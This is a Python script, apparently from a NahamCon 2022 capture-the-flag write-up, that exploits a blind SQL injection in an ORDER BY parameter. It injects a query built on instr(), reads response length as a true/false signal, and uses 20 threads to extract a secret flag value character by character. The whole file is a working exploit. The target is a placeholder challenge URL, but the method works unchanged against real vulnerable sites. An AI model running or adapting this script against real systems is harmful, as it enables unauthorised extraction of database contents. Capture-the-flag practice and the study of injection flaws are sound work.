#!/usr/bin/python3
# Taken From: https://ghostccamm.com/writeups/nahamcon-2022
# Used to exploit an injection in order by clause
import requests, threading, queue, string
import urllib.parse as url_parse

QUERY = "1 LIMIT 0, 1|1000*(SELECT instr(flag, '{chars}') FROM flag)"
THREADS = 20
TARGET = "<URL TO YOUR CHALLENGE INSTANCE>"

PREFIX = "flag{"
CHARS = "_" + string.ascii_lowercase + string.digits + string.ascii_uppercase + "}"

q = queue.Queue()
result_q = queue.Queue()

def worker():
    while True:
        chars = q.get()[0]
        if chars == None:
            break
        query = QUERY.format(
            chars=chars
        )
        r = requests.post(TARGET,data={"search":"","order":query})

        if len(r.content) > 3480:
            result_q.put((chars,))

        q.task_done()


if __name__ == "__main__":
    for c in CHARS:
        q.put((PREFIX+c,))

    threads = [
        threading.Thread(target=worker, daemon=True)
            for _t in range(THREADS)
    ]

    t: threading.Thread
    [t.start() for t in threads]

    while True:
        found_chars: str = result_q.get()[0]
        print("FOUND CHARS:", found_chars)

        for c in CHARS:
            q.put((found_chars+c,))

        result_q.task_done()
